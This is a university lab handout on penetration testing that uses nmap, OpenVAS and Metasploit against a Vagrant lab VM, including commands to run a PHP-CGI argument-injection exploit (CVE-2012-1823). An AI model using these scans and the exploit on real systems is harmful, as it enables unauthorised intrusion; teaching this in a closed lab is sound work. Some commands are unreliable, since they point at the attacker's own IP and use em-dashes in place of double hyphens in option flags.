# CSCD27 Lab 10: Penetration Testing

## Vagrant Setup

Unfortunately, this vagrant setup does not work on the linux lab. To do this exercise, you will need to install Virtualbox and Vagrant on your personal laptop.

Once installed, you can use the following vagrant boxes:
```shell
cd ~/cscd27f16_space/CSCD27-F16/assignments/03/code/part2
$ vagrant up
```

The vagrant setup is composed of two boxes:
- **kali** is the attacker's machine (ip 10.0.1.101)
- **target** is the victim's machine (ip 10.0.1.102)

In this setup, you should use exclusively ssh into the kali VM but not in the target VM.

## Nmap - Network Mapping and Host Fingerprinting

In this first part, we are going to use nmap to discover the services running on the target machine. This command exports the results in a file called `target.nmap`:

```shell
$ nmap -O —sV -p0-65535 10.0.1.101 -oN target.nmap
```

## OpenVAS - Vulnerability Scanner

In this first part, we are going to use OpenVAS vulnerability scanner to audit the security of the target:

```shell
$ openvas-setup
$ openvas-start
Starting OpenVas Services
Starting Greenbone Security Assistant: gsad.
Starting OpenVAS Scanner: openvassd.
Starting OpenVAS Manager: openvasmd.
```

**Important:** Make sure that the 4 OpenVAS components have all started correctly without any `ERROR`. If any, stop OpenVAS (`openvas-stop`) and restart it.

Once OpenVAS has correctly started, add the admin user:

```shell
$ openvasmd —create-user=admin
$ openvasmd —new-password=admin —user=admin
```

Finally, scan the target and export (as a pdf) the report through the OpenVAS web interface (https://localhost:9392)[https://localhost:9392]

## Metasploit - Exploit Framework

In this third part, we are going to use Metasploit to exploit a vulnerability ([CVE-2012-1823](http://www.cvedetails.com/cve/CVE-2012-1823/)) in the CGI module of PHP (versions before 5.3.12 and before 5.4.2). First, let us update and start the metasploit console:

```shell
$ msfupdate
$ service postgresql start
$ msfconsole
```

Thus, we can load, configure and run the exploit:

1. load the `php_cgi_arg_injection­or` exploit

    ```shell
    msf > use exploit/multi/http/php_cgi_arg_injection
    ```

2. show and assign values to the exploit arguments:

    ```shell
    msf > show options
    msf > set TARGET 10.0.1.101
    ```

3. run the exploit

    ```
    msf > exploit
    ```

